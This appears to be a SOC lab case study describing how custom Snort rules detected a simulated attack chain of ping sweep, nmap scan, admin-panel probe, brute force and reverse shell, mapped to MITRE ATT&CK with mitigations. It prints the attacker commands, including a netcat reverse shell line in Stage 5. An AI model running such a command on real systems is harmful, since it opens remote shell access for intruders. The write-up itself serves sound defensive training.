# SOC Incident Case Study
## Detection of Multi-Stage Attack Using Snort IDS

### Overview

This case study documents the detection and investigation of a simulated cyber attack within the SOC Snort IDS Lab environment.

The attack chain demonstrates common adversary behaviours including reconnaissance, service discovery, credential attacks and command-and-control communication.

The incident was detected through custom Snort intrusion detection rules aligned with the MITRE ATT&CK framework.

---

# Incident Summary

| Field                | Details                   |
|----------------------|---------------------------|
| Detection System     | Snort IDS                 |
| Target System        | Ubuntu Server             |
| Attacker System      | Windows VM                |
| Detection Method     | Custom Snort Rules        |
| Monitoring Interface | enp0s3                    |

---

# Attack Timeline

| Time | Event                    | Detection        |
| ---- | -------------------------|------------------|
| T0   | ICMP Host Discovery      | Rule SID 1000001 |
| T1   | TCP SYN Port Scan        | Rule SID 1000003 |
| T2   | Admin Panel Enumeration  | Rule SID 1000002 |
| T3   | Web Brute Force Attempt  | Rule SID 1000004 |
| T4   | Reverse Shell Connection | Rule SID 1000008 |

---

# Stage 1 — Reconnaissance

The attacker performed network discovery to identify active hosts within the environment.

### Command Used  

ping 192.168.1.3

### Detection

Snort triggered the **ICMP Host Discovery rule**.

Example alert: SOC-LAB ICMP Host Discovery


### MITRE Mapping

Technique: **T1595 – Active Scanning**

---

# Stage 2 — Service Discovery

The attacker scanned the target host to identify open services.

### Command Used

nmap -sS 192.168.1.3


### Detection

Snort detected **TCP SYN scan behaviour**.

Example alert:

### Detection

Snort detected **TCP SYN scan behaviour**.

Example alert: SOC-LAB Possible Port Scan Activity


### MITRE Mapping

Technique: **T1046 – Network Service Discovery**

---

# Stage 3 — Initial Access Enumeration

The attacker probed for sensitive endpoints on the web service.

### Command Used

curl http://192.168.1.3:8080/admin


### Detection

Snort detected suspicious HTTP requests targeting an admin panel.

Example alert: SOC-LAB Suspicious Admin Probe


### MITRE Mapping

Technique: **T1190 – Exploit Public-Facing Application**

---

# Stage 4 — Credential Attack

The attacker attempted to gain access using repeated login attempts.

### Behaviour Observed

Multiple HTTP POST requests targeting the web service.

### Detection

Snort triggered brute force detection rules.

Example alert: SOC-LAB Possible Web Brute Force

### MITRE Mapping

Technique: **T1110 – Brute Force**

---

# Stage 5 — Command & Control

After gaining access, the attacker established a reverse shell connection.

### Command Used

nc 192.168.1.4 4444 -e /bin/bash


### Detection

Snort detected outbound connection activity consistent with reverse shell communication.

Example alert: SOC-LAB Reverse Shell Outbound Connection


### MITRE Mapping

Technique: **T1071 – Application Layer Protocol**

---

# Investigation

Reviewed Snort alert logs and correlated activity across multiple detection events.

Investigation steps included:

- Reviewing Snort alert logs
- Inspecting packet captures using tcpdump
- Correlating detection timestamps
- Mapping events to MITRE ATT&CK techniques

This confirmed the presence of a **multi-stage attack chain**.

---

# Impact Assessment

The simulated attacker achieved command execution on the target system through a reverse shell connection.

If this occurred in a production environment, potential risks could include:

- Unauthorized system access
- Data exfiltration
- Lateral movement
- Persistence installation

---

# Recommended Mitigations

Recommended defensive measures include:

• Deploy network intrusion detection systems across key network segments  
• Implement web application firewalls for public services  
• Enforce strong authentication mechanisms  
• Monitor outbound network traffic for suspicious connections  
• Perform regular vulnerability assessments  

---

# Conclusion

This SOC lab demonstrates the effectiveness of custom detection rules in identifying adversary activity across multiple stages of an attack.

The investigation highlights the importance of **layered detection strategies** and continuous monitoring in modern security operations.








